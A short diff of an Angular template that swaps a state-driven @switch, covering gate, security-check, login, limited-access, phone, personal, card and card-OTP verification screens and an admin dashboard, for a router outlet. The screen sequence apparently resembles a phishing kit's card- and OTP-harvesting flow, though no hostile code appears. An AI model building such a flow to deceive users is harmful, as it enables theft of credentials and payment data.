@@ -1,46 +1,5 @@
 
-@switch (state.currentView()) {
-  @case ('gate') {
-    <app-gate></app-gate>
-  }
-  @case ('security_check') {
-    <app-security-check></app-security-check>
-  }
-  @case ('login') {
-    <app-login></app-login>
-  }
-  @case ('limited') {
-    <app-limited-access></app-limited-access>
-  }
-  @case ('phone') {
-    <app-phone-verification></app-phone-verification>
-  }
-  @case ('personal') {
-    <app-personal-verification></app-personal-verification>
-  }
-  @case ('card') {
-    <app-card-verification></app-card-verification>
-  }
-  @case ('card_otp') {
-    <app-card-otp></app-card-otp>
-  }
-  @case ('loading') {
-    @if (state.isFlowComplete()) {
-      <app-success></app-success>
-    } @else {
-      <app-loading></app-loading>
-    }
-  }
-  @case ('step_success') {
-    <app-step-success></app-step-success>
-  }
-  @case ('success') {
-    <app-success></app-success>
-  }
-  @case ('admin') {
-    <app-admin-dashboard></app-admin-dashboard>
-  }
-}
+<router-outlet></router-outlet>
 
 <!-- Session Timeout Warning Modal -->
 <!-- Defensive check: ensure showTimeoutWarning exists before calling -->
